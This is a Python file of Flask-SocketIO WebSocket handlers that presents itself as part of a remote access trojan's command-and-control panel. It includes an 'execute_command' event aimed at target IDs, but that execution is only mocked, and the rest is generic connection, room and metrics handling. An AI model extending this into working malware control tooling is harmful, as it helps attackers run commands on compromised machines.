#!/usr/bin/env python3
"""
WebSocket Handlers for Oranolio RAT - Elite C2 Framework
Handles real-time communication via WebSockets
"""

import os
import sys
import json
import logging
from datetime import datetime
from flask_socketio import SocketIO, emit, join_room, leave_room, disconnect
from flask import request, session

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Import utilities
from auth_utils import session_manager
from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
from web_app_enhancements import get_connection_manager, get_metrics_collector, log_command_execution

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global instances
connection_manager = get_connection_manager()
metrics_collector = get_metrics_collector()

def register_websocket_handlers(socketio: SocketIO):
    """Register all WebSocket event handlers"""
    
    @socketio.on('connect')
    def handle_connect():
        """Handle client connection"""
        try:
            # Get client information
            client_ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            # Generate connection ID
            connection_id = f"ws_{int(datetime.now().timestamp() * 1000)}"
            
            # Add connection to manager
            success = connection_manager.add_connection(connection_id, client_ip, user_agent)
            
            if success:
                # Store connection ID in session
                session['ws_connection_id'] = connection_id
                
                # Join user to their personal room
                user_id = session.get('user_id')
                if user_id:
                    join_room(f"user_{user_id}")
                    connection_manager.update_activity(connection_id, 'websocket_connect')
                
                logger.info(f"WebSocket client connected: {connection_id} from {client_ip}")
                emit('connected', {'connection_id': connection_id, 'status': 'connected'})
            else:
                logger.warning(f"Failed to add WebSocket connection: {connection_id}")
                emit('error', {'message': 'Connection limit reached'})
                disconnect()
                
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.NETWORK)
            
            logger.error(f"Error in WebSocket connect: {e}")
            emit('error', {'message': 'Connection failed'})
            disconnect()
    
    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle client disconnection"""
        try:
            connection_id = session.get('ws_connection_id')
            if connection_id:
                # Remove connection from manager
                connection_manager.remove_connection(connection_id)
                
                # Leave user room
                user_id = session.get('user_id')
                if user_id:
                    leave_room(f"user_{user_id}")
                
                logger.info(f"WebSocket client disconnected: {connection_id}")
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.LOW, ErrorCategory.NETWORK)
            
            logger.error(f"Error in WebSocket disconnect: {e}")
    
    @socketio.on('join_room')
    def handle_join_room(data):
        """Handle joining a room"""
        try:
            room = data.get('room')
            if not room:
                emit('error', {'message': 'Room name required'})
                return
            
            # Validate room access
            user_id = session.get('user_id')
            if not user_id:
                emit('error', {'message': 'Authentication required'})
                return
            
            # Join the room
            join_room(room)
            emit('joined_room', {'room': room})
            
            logger.info(f"User {user_id} joined room: {room}")
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Failed to join room'})
    
    @socketio.on('leave_room')
    def handle_leave_room(data):
        """Handle leaving a room"""
        try:
            room = data.get('room')
            if not room:
                emit('error', {'message': 'Room name required'})
                return
            
            # Leave the room
            leave_room(room)
            emit('left_room', {'room': room})
            
            user_id = session.get('user_id')
            logger.info(f"User {user_id} left room: {room}")
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Failed to leave room'})
    
    @socketio.on('execute_command')
    def handle_execute_command(data):
        """Handle command execution request"""
        try:
            # Validate authentication
            user_id = session.get('user_id')
            if not user_id:
                emit('error', {'message': 'Authentication required'})
                return
            
            # Extract command data
            command = data.get('command')
            target_id = data.get('target_id')
            async_execution = data.get('async', False)
            
            if not command or not target_id:
                emit('error', {'message': 'Command and target ID required'})
                return
            
            # Log command execution start
            start_time = datetime.now()
            logger.info(f"Executing command '{command}' on target '{target_id}' by user {user_id}")
            
            # Emit command started event
            emit('command_started', {
                'command': command,
                'target_id': target_id,
                'start_time': start_time.isoformat(),
                'async': async_execution
            })
            
            # Simulate command execution
            # In a real implementation, this would interface with the C2 server
            import time
            time.sleep(1)  # Simulate execution time
            
            # Generate mock result
            result = {
                'command_id': f"cmd_{int(datetime.now().timestamp() * 1000)}",
                'command': command,
                'target_id': target_id,
                'status': 'completed',
                'output': f"Command '{command}' executed successfully on {target_id}",
                'error': None,
                'execution_time': 1.0,
                'timestamp': datetime.now().isoformat()
            }
            
            # Log command execution
            log_command_execution(command, str(user_id), True, 1.0)
            
            # Update connection activity
            connection_id = session.get('ws_connection_id')
            if connection_id:
                connection_manager.update_activity(connection_id, command, len(str(result)))
            
            # Emit command completed event
            emit('command_completed', result)
            
            # Broadcast to room if specified
            room = data.get('room')
            if room:
                emit('command_completed', result, room=room)
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                command=data.get('command') if 'data' in locals() else None,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Command execution failed'})
    
    @socketio.on('get_system_status')
    def handle_get_system_status():
        """Handle system status request"""
        try:
            # Get system metrics
            performance = metrics_collector.get_performance_summary()
            system_metrics = metrics_collector.get_system_metrics(1)
            
            # Get connection count
            connections = connection_manager.get_all_connections()
            active_connections = len(connections)
            
            status = {
                'timestamp': datetime.now().isoformat(),
                'active_connections': active_connections,
                'performance': performance,
                'system_metrics': system_metrics[0] if system_metrics else None
            }
            
            emit('system_status', status)
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.SYSTEM)
            
            emit('error', {'message': 'Failed to get system status'})
    
    @socketio.on('get_connections')
    def handle_get_connections():
        """Handle connections request"""
        try:
            connections = connection_manager.get_all_connections()
            
            # Convert to serializable format
            connections_data = []
            for conn in connections:
                connections_data.append({
                    'connection_id': conn.connection_id,
                    'client_ip': conn.client_ip,
                    'user_agent': conn.user_agent,
                    'connected_at': conn.connected_at.isoformat(),
                    'last_activity': conn.last_activity.isoformat(),
                    'command_count': conn.command_count,
                    'bytes_transferred': conn.bytes_transferred,
                    'is_authenticated': conn.is_authenticated,
                    'user_id': conn.user_id
                })
            
            emit('connections', {
                'connections': connections_data,
                'total': len(connections_data)
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Failed to get connections'})
    
    @socketio.on('get_metrics')
    def handle_get_metrics():
        """Handle metrics request"""
        try:
            # Get performance metrics
            performance = metrics_collector.get_performance_summary()
            system_metrics = metrics_collector.get_system_metrics(10)
            command_metrics = metrics_collector.get_command_metrics(10)
            
            metrics = {
                'performance': performance,
                'system_metrics': system_metrics,
                'command_metrics': command_metrics,
                'timestamp': datetime.now().isoformat()
            }
            
            emit('metrics', metrics)
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Failed to get metrics'})
    
    @socketio.on('ping')
    def handle_ping():
        """Handle ping request"""
        try:
            emit('pong', {'timestamp': datetime.now().isoformat()})
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.LOW, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Ping failed'})
    
    @socketio.on('broadcast_message')
    def handle_broadcast_message(data):
        """Handle broadcast message"""
        try:
            # Validate authentication
            user_id = session.get('user_id')
            if not user_id:
                emit('error', {'message': 'Authentication required'})
                return
            
            message = data.get('message')
            room = data.get('room')
            
            if not message:
                emit('error', {'message': 'Message required'})
                return
            
            # Create message object
            message_data = {
                'id': f"msg_{int(datetime.now().timestamp() * 1000)}",
                'message': message,
                'user_id': user_id,
                'timestamp': datetime.now().isoformat()
            }
            
            # Broadcast to room or all clients
            if room:
                emit('broadcast_message', message_data, room=room)
            else:
                emit('broadcast_message', message_data, broadcast=True)
            
            logger.info(f"Message broadcasted by user {user_id}: {message}")
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Failed to broadcast message'})
    
    @socketio.on('file_upload_progress')
    def handle_file_upload_progress(data):
        """Handle file upload progress updates"""
        try:
            # Validate authentication
            user_id = session.get('user_id')
            if not user_id:
                emit('error', {'message': 'Authentication required'})
                return
            
            file_id = data.get('file_id')
            progress = data.get('progress', 0)
            status = data.get('status', 'uploading')
            
            if not file_id:
                emit('error', {'message': 'File ID required'})
                return
            
            # Emit progress update
            emit('file_upload_progress', {
                'file_id': file_id,
                'progress': progress,
                'status': status,
                'timestamp': datetime.now().isoformat()
            })
            
            # Broadcast to user room
            emit('file_upload_progress', {
                'file_id': file_id,
                'progress': progress,
                'status': status,
                'timestamp': datetime.now().isoformat()
            }, room=f"user_{user_id}")
            
        except Exception as e:
            context = ErrorContext(
                user_id=session.get('user_id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            emit('error', {'message': 'Failed to update file upload progress'})
    
    @socketio.on('error')
    def handle_error(data):
        """Handle client error reports"""
        try:
            error_message = data.get('message', 'Unknown error')
            error_stack = data.get('stack', '')
            
            user_id = session.get('user_id')
            connection_id = session.get('ws_connection_id')
            
            # Log client error
            logger.error(f"Client error from user {user_id} (connection {connection_id}): {error_message}")
            if error_stack:
                logger.error(f"Client error stack: {error_stack}")
            
            # Create error context
            context = ErrorContext(
                user_id=user_id,
                ip_address=request.remote_addr,
                additional_data={
                    'error': error_message,
                    'stack': error_stack,
                    'connection_id': connection_id
                }
            )
            
            # Report to error handler
            error_handler.handle_error(
                Exception(error_message), 
                context, 
                ErrorSeverity.MEDIUM, 
                ErrorCategory.APPLICATION
            )
            
            # Acknowledge error report
            emit('error_acknowledged', {'message': 'Error reported successfully'})
            
        except Exception as e:
            logger.error(f"Error handling client error report: {e}")
            emit('error', {'message': 'Failed to report error'})

# Example usage and testing
if __name__ == "__main__":
    print("WebSocket Handlers")
    print("=" * 30)
    print("Event handlers registered:")
    print("  connect - Handle client connection")
    print("  disconnect - Handle client disconnection")
    print("  join_room - Join a room")
    print("  leave_room - Leave a room")
    print("  execute_command - Execute command on target")
    print("  get_system_status - Get system status")
    print("  get_connections - Get active connections")
    print("  get_metrics - Get system metrics")
    print("  ping - Ping/pong for connection testing")
    print("  broadcast_message - Broadcast message to room/all")
    print("  file_upload_progress - File upload progress updates")
    print("  error - Handle client error reports")
    print("WebSocket handlers ready!")